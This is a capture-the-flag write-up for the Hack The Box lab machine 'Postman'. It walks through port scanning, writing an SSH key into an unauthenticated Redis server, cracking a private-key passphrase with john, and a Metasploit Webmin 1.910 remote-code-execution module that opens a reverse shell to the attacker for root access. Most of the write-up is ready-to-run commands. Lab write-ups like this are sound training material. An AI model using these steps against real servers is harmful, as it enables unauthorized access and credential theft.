<h2>Target: 10.10.10.160 Postman</h2>

<b>Initial Access:</b><br>
nmap -Pn 10.10.10.160 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Output shows open ports: 22, 80, 6379, 10000

Enumerate these open ports further with nmap: <br>
nmap -Pn 10.10.10.160 --min-rate=5000 -p 22,80,6379,10000 -sC -sV -oN nmap.postman
 
![image](https://user-images.githubusercontent.com/93153300/204876854-dea7d6a0-ab9b-4857-9e38-e00cf45fb802.png)
Visiting port 80 and enumerating the site we don’t find anything of interest.  Visiting port 10000 shows:
 
![image](https://user-images.githubusercontent.com/93153300/204876897-dd434127-0d98-4957-b33b-1aaf323cec4f.png)
 
We don’t have credentials, and default credentials don’t work either.  However, the page does show that it is using Webmin and nmap showed that the version is 1.910.  Search for an exploit using command: searchsploit webmin.  Searchsploit returns a webmin 1.910 exploit: 

![image](https://user-images.githubusercontent.com/93153300/204876917-73b74713-e349-4809-b25e-95fd0beb257d.png)
 
Reading through the code of the exploit 46984.rb shows that this exploit will get us a shell as root, but we need credentials for this exploit.  Since we don't have credentials their isn't much more we can do on port 10000.  

Looking at our nmap scan, port 6379 shows Redis version 4.0.9.  Google  search ‘Redis 4  exploit’  found https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis.  The hacktricks site we found shows:
 
![image](https://user-images.githubusercontent.com/93153300/204876949-5d0ae1dc-653c-4f73-a57d-62ae94ab7b2d.png)
 
Following the steps shown on the hacktricks screenshot above:<br>
Step 1: Login to  redis using command: redis-cli -h 10.10.10.160 <br>
Step 2: on redis run: config get dir

![image](https://user-images.githubusercontent.com/93153300/204877010-a3b62982-962a-4ad1-9a31-c435cefa51ee.png)

Take note of the directory “/var/lib/redis”.<br>
Step 3: on our local kali run: ssh-keygen -t rsa <br>
Step 4: on our local kali run: (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt <br>
Step 5: on our local kali run: cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key <br>
Step 6: on redis run: config set dir /var/lib/redis/.ssh <br>
Step 7: on redis run: config set dbfilename "authorized_keys" <br>
Step 8: on redis run: save <br>
Step 9: on our local kali run: chmod 600 id_rsa <br>
Step 10: on our local kali run: ssh -i id_rsa redis@10.10.10.160
 
We have shell as user redis:

![image](https://user-images.githubusercontent.com/93153300/204877029-0198ffcc-df1b-4130-b237-b2860a87d7e1.png)

__________________________________________________________________
<b>Lateral Movement:</b><br>
File /etc/passwd shows their is a user Matt.

In directory /opt we find a file called id_rsa.bak, which is a private ssh key.  Perhaps this is Matt’s private ssh key.  Download the file id_rsa.bak to our local kali.   The key is protected with a passphrase, use ssh2john to crack the passphrase.  

Step 1: ssh2john id_rsa.bak > hash <br>
Step 2: john hash --wordlist=/usr/share/wordlists/rockyou.txt   → Found passphrase: computer2008

Even though we have the private key, we cannot log into user Matt via ssh.  Reading the file /etc/ssh/sshd_config explains why:

![image](https://user-images.githubusercontent.com/93153300/204877059-43448b02-1272-4f6d-b8a6-3b636a8ec6a1.png)
 
This file denies user Matt to login via ssh. Instead, run command: su Matt → enter the password when prompted.

It worked, we have shell as user Matt.  We can get the flag in /home/Matt/user.txt
___________________________________________________________________________
<b>Privilege Escalation</b><br>
Going back to the webmin site on port 10000, try Matt’s credentials for login.  It works, we get logged in.   Now that we have credentials for webmin, we can go back to the exploit we found for webmin.  These are the steps for the exploit:

Step 1: msfconsole -q <br>
Step 2: use exploit/linux/http/webmin_packageup_rce <br>
Step 3: show options: 

![image](https://user-images.githubusercontent.com/93153300/204877105-fc6d7664-9723-40f0-9246-9cef981bb496.png)


Step 4: Fill out the options: set lhost tun0 → set lport 443 → set rhosts 10.10.10.160 → set username Matt → set password computer2008 → set ssl true → run
 
![image](https://user-images.githubusercontent.com/93153300/204877140-20a93322-ac67-4a05-8540-4243d8ac53ab.png)
 
We get shell as root.  We can get the flag in /root/root.txt.
